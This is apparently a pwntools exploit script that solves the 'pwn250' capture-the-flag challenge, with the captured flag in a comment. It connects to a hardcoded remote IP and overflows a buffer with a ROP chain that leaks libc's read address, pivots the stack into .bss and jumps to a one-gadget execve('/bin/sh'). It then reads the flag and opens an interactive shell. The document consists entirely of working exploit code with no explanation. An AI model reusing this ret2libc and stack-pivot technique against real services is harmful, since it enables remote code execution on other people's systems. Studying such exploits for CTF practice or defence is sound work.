#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# Bugs_Bunny{Did_Ropgadget_help_pwner!_maybe_we_have_smart_guys_here!!}

host , port = '54.153.19.139' , 5255
#host , port = '192.168.78.133' , 4000
y = remote( host , port )

e = ELF( 'pwn250' )
l = ELF( 'libc.so' )

'''
0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
'''

magic = 0x4526a

pppr = 0x40056a # pop rdi ; pop rsi ; pop rdx ; ret
pop_rdi = 0x400633
leave_ret = 0x400590


p = 'D' * 0x80
p += p64( e.bss() )
p += p64( pppr )
p += p64( 0x1 )
p += p64( e.got['read'] )
p += p64( 0x8 )
p += p64( e.plt['write'] )

p += p64( pppr )
p += p64( 0x0 )
p += p64( e.bss() )
p += p64( 0x77 )
p += p64( e.plt['read'] )
p += p64( leave_ret )


y.send( p )

o = y.recv(8)
l.address += u64( o.ljust( 8 , '\x00' ) ) - l.symbols['read']

p = 'DDDDDDDD'
p += p64( l.address + magic )

y.send( p )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()